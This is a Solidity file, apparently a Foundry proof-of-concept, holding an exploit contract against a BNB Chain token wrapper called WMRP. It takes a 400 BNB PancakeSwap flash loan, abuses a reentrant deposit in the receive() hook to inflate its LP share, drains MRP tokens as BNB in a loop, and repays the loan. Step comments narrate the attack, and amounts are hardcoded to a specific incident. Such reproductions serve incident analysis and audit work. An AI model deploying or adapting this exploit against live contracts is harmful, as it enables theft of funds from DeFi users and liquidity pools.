import {Test, console} from "forge-std/Test.sol";

interface PancakeSwap {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address receiver,
        bytes calldata data
    ) external;
}

interface PancakeSwapReceiver {
    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external virtual;
}

interface On314Swaper {
    function on314Swaper() external returns (bytes4);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface WBNB {
    function transfer(address to, uint256 amount) external returns (bool);

    function withdraw(uint amount) external;

    function balanceOf(address account) external view returns (uint256);

    function deposit() external payable;
}

interface WMRP {
    function LPTotalSupply() external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function getLPAmount(
        uint256 value,
        bool isEth
    ) external view returns (uint256 amount);

    function LPBalanceOf(address account) external view returns (uint256);

    function getContractEthAmount() external view returns (uint256);

    receive() external payable;
}

contract AttackContract is PancakeSwapReceiver, On314Swaper {
    PancakeSwap pancakePair;
    WMRP wmrp;
    WBNB wbnb;
    IERC20 mrp;

    uint256 constant AMOUNT = 400_000_000_000_000_000_000; // 400 BNB

    constructor(
        address _pancakePair,
        address _wmrp,
        address _mrp,
        address _wbnb
    ) {
        pancakePair = PancakeSwap(_pancakePair);
        mrp = IERC20(_mrp);
        wmrp = WMRP(payable(_wmrp));
        wbnb = WBNB(_wbnb);
    }

    function attack() external {
        // Step 1, flashloan
        pancakePair.swap(0, AMOUNT, address(this), bytes("hello"));
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        uint wbnbBalance = wbnb.balanceOf(address(this));
        // Step 2, convert all of the WBNB that was flashloaned into BNB
        wbnb.withdraw(wbnbBalance);
        // Step 3, deposit a tiny amount of the BNB
        (bool success, ) = payable(address(wmrp)).call{
            value: 43.140579559750808986 ether
        }("");
        require(success, "Deposit failed");
        bool wmrpTransferSuccess = wmrp.transfer(address(wmrp), 0);
        require(wmrpTransferSuccess, "wmrpTransferSuccess transfer failed");
        uint mrpBalance = mrp.balanceOf(address(this));
        mrp.transfer(address(wmrp), mrpBalance);
        uint wmrpBalance = wmrp.balanceOf(address(wmrp));
        uint lpToken = wmrp.getLPAmount(wmrpBalance, false);
        (bool secondDeposituccess, ) = payable(address(wmrp)).call{
            value: lpToken
        }("");
        require(secondDeposituccess, "Deposit failed");
        uint wmrpLpBalanceOfAttacker = wmrp.LPBalanceOf(address(this));
        uint lpTotalSupply = wmrp.LPTotalSupply();
        uint wmrpBalance2 = wmrp.balanceOf(address(wmrp));
        // Step 4 initiate withdrawal
        bool secondTransfer = wmrp.transfer(address(this), 0);
        require(secondTransfer, "Second transfer failed");
        uint attackerWmrpBalance = wmrp.balanceOf(address(wmrp));
        uint attackerMrpBalance = mrp.balanceOf(address(this));
        mrp.transfer(address(wmrp), 1_268_882_781_747_472_010_805);
        bool thirdTransfer = wmrp.transfer(address(wmrp), 0);
        require(thirdTransfer, "thirdTransfer transfer failed");
        uint finalMrpBalance = mrp.balanceOf(address(this));
        uint transferAmount = 304917777488969791997;

        // Step 6, withdraw all the ill gotten mrp tokens as bnb
        for (uint i = 0; i < 20; i++) {
            bool transferSucess = mrp.transfer(address(mrp), transferAmount);
            require(transferSucess, "Transfer to MRP failed");
        }

        // Step 7 repay flashloan to pancakeswap
        wbnb.deposit{value: 401.2 ether}();
        wbnb.transfer(address(pancakePair), 401.2 ether);
    }

    function on314Swaper() external override returns (bytes4 emptyBytes) {}

    fallback() external payable {
        console.log("Fallback called with value:", msg.value);
    }

    receive() external payable {
        if (msg.sender != address(wmrp)) {
            return;
        }
        if (msg.value < 58.398821189089608209 ether) {
            return;
        }
        uint wmrpBalance = wmrp.balanceOf(address(wmrp));
        uint wmrpEth = wmrp.getContractEthAmount();
        // Step 5, reenter the contract to deposit some more ether(bnb) at a higher exchange rate
        // This deposit mistakenly takes into account
        (bool success, ) = payable(address(wmrp)).call{value: wmrpEth}("");
    }
}
